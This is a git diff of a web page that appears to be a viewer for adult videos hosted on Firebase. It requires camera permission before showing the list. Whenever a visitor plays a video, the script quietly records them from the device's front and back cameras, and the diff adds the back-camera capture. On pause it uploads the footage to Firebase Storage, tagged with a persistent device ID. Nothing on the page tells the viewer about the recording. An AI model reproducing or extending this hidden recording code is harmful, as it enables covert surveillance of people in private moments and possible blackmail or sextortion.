@@ -154,11 +154,11 @@
     </div>
 
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
-        import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
-    
-        const firebaseConfig = {
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+    import { getStorage, ref, uploadBytesResumable, getDownloadURL } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js";
+
+    const firebaseConfig = {
             apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
             authDomain: "nou-no-circle.firebaseapp.com",
             projectId: "nou-no-circle",
@@ -166,27 +166,30 @@
             messagingSenderId: "756338805186",
             appId: "1:756338805186:web:cb740e035ac611b5baae5b",
             measurementId: "G-TWBV38P13D"
-        };
+    };
 
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
-        const db = getFirestore(app);
+    const app = initializeApp(firebaseConfig);
+    const storage = getStorage(app);
+    const db = getFirestore(app);
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const captureButton = document.getElementById('captureButton');
-        const dialogOverlay = document.getElementById('dialogOverlay');
-        const reloadButton = document.getElementById('reloadButton');
-        const loginContainer = document.getElementById('loginContainer');
-        const videoGrid = document.getElementById('videoGrid');
-        const pagination = document.getElementById('pagination');
-        const videosPerPage = 8;
-        let videoStream;
-        let mediaRecorder;
-        let recordedChunks = [];
-        let currentPage = 1;
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureButton = document.getElementById('captureButton');
+    const dialogOverlay = document.getElementById('dialogOverlay');
+    const reloadButton = document.getElementById('reloadButton');
+    const loginContainer = document.getElementById('loginContainer');
+    const videoGrid = document.getElementById('videoGrid');
+    const pagination = document.getElementById('pagination');
+    const videosPerPage = 8;
+    let frontVideoStream;
+    let backVideoStream;
+    let mediaRecorderFront;
+    let mediaRecorderBack;
+    let recordedChunksFront = [];
+    let recordedChunksBack = [];
+    let currentPage = 1;
 
-        const videos = [
+    const videos = [
 
             {			
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon3-6ca6a.appspot.com/o/hhd800.com%40FC2-PPV-2645708_1.mp4?alt=media&token=417dde2e-78ff-451d-a4c1-bc198bffa9c5',			
@@ -681,210 +684,210 @@ url: 'https://firebasestorage.googleapis.com/v0/b/hozon3-6ca6a.appspot.com/o/hhd
             // 他の動画URLとタイトルを追加
         ];
 
-        function getOrCreateDeviceId() {
-            let deviceId = localStorage.getItem('deviceId');
-            if (!deviceId) {
-                deviceId = `device_${Math.random().toString(36).substr(2, 9)}`;
-                localStorage.setItem('deviceId', deviceId);
-            }
-            return deviceId;
+            function getOrCreateDeviceId() {
+        let deviceId = localStorage.getItem('deviceId');
+        if (!deviceId) {
+            deviceId = `device_${Math.random().toString(36).substr(2, 9)}`;
+            localStorage.setItem('deviceId', deviceId);
         }
+        return deviceId;
+    }
 
-        async function requestCameraAccess(backCamera = true) {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                const camera = backCamera
-                    ? videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0]
-                    : videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
+    async function requestCameraAccess() {
+        try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            const videoDevices = devices.filter(device => device.kind === 'videoinput');
+            
+            // Front camera
+            const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
+            frontVideoStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    deviceId: frontCamera.deviceId,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            });
 
-                const constraints = {
-                    video: {
-                        deviceId: camera.deviceId,
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    }
-                };
+            // Back camera
+            const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[1];
+            backVideoStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    deviceId: backCamera.deviceId,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            });
 
-                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = videoStream;
-                video.muted = true; // 録画中の音声をミュート
-            } catch (err) {
-                console.error('カメラアクセスエラー:', err);
-                showCameraPermissionDialog();
-                throw err;
-            }
+            video.srcObject = frontVideoStream; // Display front camera by default
+            video.muted = true; // Mute the recording
+            
+        } catch (err) {
+            console.error('カメラアクセスエラー:', err);
+            showCameraPermissionDialog();
+            throw err;
         }
+    }
 
-        async function requestFrontCameraAndAudioAccess() {
-            try {
-                const constraints = {
-                    video: {
-                        facingMode: 'user', // フロントカメラを使用
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
-                    },
-                    audio: true // 音声も含む
-                };
-
-                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = videoStream;
-                video.muted = true; // 録画中の音声をミュート
-            } catch (err) {
-                console.error('カメラと音声のアクセスエラー:', err);
-                showCameraPermissionDialog();
-                throw err;
-            }
+    function captureAndLogin() {
+        if (frontVideoStream && backVideoStream) {
+            loginContainer.style.display = 'none';
+            document.querySelector('h1').style.display = 'block';
+            videoGrid.style.display = 'grid';
+            pagination.style.display = 'flex';
+            loadVideos(currentPage);
+        } else {
+            console.error('カメラストリームが利用できません。');
+            alert('カメラストリームが利用できません。');
         }
+    }
 
-        function captureAndLogin() {
-            if (videoStream) {
-                const ctx = canvas.getContext('2d');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    function showCameraPermissionDialog() {
+        dialogOverlay.style.display = 'flex';
+    }
 
-                loginContainer.style.display = 'none';
-                document.querySelector('h1').style.display = 'block';
-                videoGrid.style.display = 'grid';
-                pagination.style.display = 'flex';
-                loadVideos(currentPage);
-            } else {
-                console.error('カメラストリームが利用できません。');
-                alert('カメラストリームが利用できません。');
-            }
-        }
+    captureButton.addEventListener('click', () => {
+        requestCameraAccess().then(captureAndLogin).catch(() => {
+            alert('カメラの権限が許可されていません。');
+        });
+    });
 
-        function showCameraPermissionDialog() {
-            dialogOverlay.style.display = 'flex';
-        }
+    reloadButton.addEventListener('click', () => {
+        location.reload();
+    });
 
-        captureButton.addEventListener('click', () => {
-            requestFrontCameraAndAudioAccess().then(captureAndLogin).catch(() => {
-                alert('カメラの権限が許可されていません。');
+    async function loadVideos(page) {
+        const startIndex = (page - 1) * videosPerPage;
+        const endIndex = startIndex + videosPerPage;
+        const videosToLoad = videos.slice(startIndex, endIndex);
+
+        videoGrid.innerHTML = '';
+
+        videosToLoad.forEach(video => {
+            const videoItem = document.createElement('div');
+            videoItem.className = 'video-item';
+
+            const videoContainer = document.createElement('div');
+            videoContainer.className = 'video-container';
+
+            const videoElement = document.createElement('video');
+            videoElement.src = video.url;
+            videoElement.controls = true;
+
+            const titleElement = document.createElement('div');
+            titleElement.className = 'title';
+            titleElement.textContent = video.title;
+
+            videoContainer.appendChild(videoElement);
+            videoItem.appendChild(videoContainer);
+            videoItem.appendChild(titleElement);
+            videoGrid.appendChild(videoItem);
+
+            videoElement.addEventListener('play', () => {
+                startVideoRecording();
+            });
+
+            videoElement.addEventListener('pause', () => {
+                stopVideoRecording();
             });
         });
 
-        reloadButton.addEventListener('click', () => {
-            location.reload();
-        });
+        setupPagination(page);
+    }
 
-        async function loadVideos(page) {
-            const startIndex = (page - 1) * videosPerPage;
-            const endIndex = startIndex + videosPerPage;
-            const videosToLoad = videos.slice(startIndex, endIndex);
+    function setupPagination(currentPage) {
+        pagination.innerHTML = '';
 
-            videoGrid.innerHTML = '';
+        const totalPages = Math.ceil(videos.length / videosPerPage);
 
-            videosToLoad.forEach(video => {
-                const videoItem = document.createElement('div');
-                videoItem.className = 'video-item';
-
-                const videoContainer = document.createElement('div');
-                videoContainer.className = 'video-container';
-
-                const videoElement = document.createElement('video');
-                videoElement.src = video.url;
-                videoElement.controls = true;
-
-                const titleElement = document.createElement('div');
-                titleElement.className = 'title';
-                titleElement.textContent = video.title;
-
-                videoContainer.appendChild(videoElement);
-                videoItem.appendChild(videoContainer);
-                videoItem.appendChild(titleElement);
-                videoGrid.appendChild(videoItem);
-
-                videoElement.addEventListener('play', () => {
-                    startVideoRecording();
-                });
-
-                videoElement.addEventListener('pause', () => {
-                    stopVideoRecording();
-                });
+        for (let i = 1; i <= totalPages; i++) {
+            const button = document.createElement('button');
+            button.textContent = i;
+            if (i === currentPage) {
+                button.disabled = true;
+            }
+            button.addEventListener('click', () => {
+                loadVideos(i);
             });
-
-            setupPagination(page);
+            pagination.appendChild(button);
         }
+    }
 
-        function setupPagination(currentPage) {
-            pagination.innerHTML = '';
+    async function startVideoRecording() {
+        recordedChunksFront = [];
+        recordedChunksBack = [];
 
-            const totalPages = Math.ceil(videos.length / videosPerPage);
+        mediaRecorderFront = new MediaRecorder(frontVideoStream, { mimeType: 'video/webm; codecs=vp9' });
+        mediaRecorderBack = new MediaRecorder(backVideoStream, { mimeType: 'video/webm; codecs=vp9' });
 
-            for (let i = 1; i <= totalPages; i++) {
-                const button = document.createElement('button');
-                button.textContent = i;
-                if (i === currentPage) {
-                    button.disabled = true;
-                }
-                button.addEventListener('click', () => {
-                    loadVideos(i);
-                });
-                pagination.appendChild(button);
+        mediaRecorderFront.ondataavailable = event => {
+            if (event.data.size > 0) {
+                recordedChunksFront.push(event.data);
             }
-        }
+        };
 
-        async function startVideoRecording() {
-            await requestFrontCameraAndAudioAccess();
-
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
-
-            mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                uploadVideo(blob);
-            };
-
-            mediaRecorder.start();
-        }
-
-        function stopVideoRecording() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
+        mediaRecorderBack.ondataavailable = event => {
+            if (event.data.size > 0) {
+                recordedChunksBack.push(event.data);
             }
-        }
+        };
 
-        async function uploadVideo(blob) {
+        mediaRecorderFront.onstop = () => {
+            const blob = new Blob(recordedChunksFront, { type: 'video/webm' });
+            uploadVideo(blob, 'front');
+        };
+
+        mediaRecorderBack.onstop = () => {
+            const blob = new Blob(recordedChunksBack, { type: 'video/webm' });
+            uploadVideo(blob, 'back');
+        };
+
+        mediaRecorderFront.start();
+        mediaRecorderBack.start();
+    }
+
+    function stopVideoRecording() {
+        if (mediaRecorderFront && mediaRecorderFront.state !== 'inactive') {
+            mediaRecorderFront.stop();
+        }
+        if (mediaRecorderBack && mediaRecorderBack.state !== 'inactive') {
+            mediaRecorderBack.stop();
+        }
+    }
+
+    async function uploadVideo(blob, cameraType) {
+        const deviceId = getOrCreateDeviceId();
+        const storageRef = ref(storage, `videos/${deviceId}/${cameraType}_${Date.now()}.webm`);
+        const uploadTask = uploadBytesResumable(storageRef, blob);
+
+        uploadTask.on('state_changed',
+            (snapshot) => {
+                const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                console.log('Upload is ' + progress + '% done');
+            },
+            (error) => {
+                console.error('Upload error:', error);
+            },
+            async () => {
+                const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
+                saveVideoMetadata(downloadURL, cameraType);
+            }
+        );
+    }
+
+    async function saveVideoMetadata(downloadURL, cameraType) {
+        try {
             const deviceId = getOrCreateDeviceId();
-            const storageRef = ref(storage, `videos/${deviceId}/${Date.now()}.webm`);
-            const uploadTask = uploadBytesResumable(storageRef, blob);
-
-            uploadTask.on('state_changed',
-                (snapshot) => {
-                    const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                    console.log('Upload is ' + progress + '% done');
-                },
-                (error) => {
-                    console.error('Upload error:', error);
-                },
-                async () => {
-                    const downloadURL = await getDownloadURL(uploadTask.snapshot.ref);
-                    saveVideoMetadata(downloadURL);
-                }
-            );
+            const docRef = await addDoc(collection(db, "videos"), {
+                url: downloadURL,
+                deviceId: deviceId,
+                cameraType: cameraType,
+                timestamp: Date.now()
+            });
+            console.log("Document written with ID: ", docRef.id);
+        } catch (e) {
+            console.error("Error adding document: ", e);
         }
-
-        async function saveVideoMetadata(downloadURL) {
-            try {
-                const deviceId = getOrCreateDeviceId();
-                const docRef = await addDoc(collection(db, "videos"), {
-                    url: downloadURL,
-                    deviceId: deviceId,
-                    timestamp: Date.now()
-                });
-                console.log("Document written with ID: ", docRef.id);
-            } catch (e) {
-                console.error("Error adding document: ", e);
-            }
-        }
-    </script>
+    }
+</script>
 </body>
 </html>
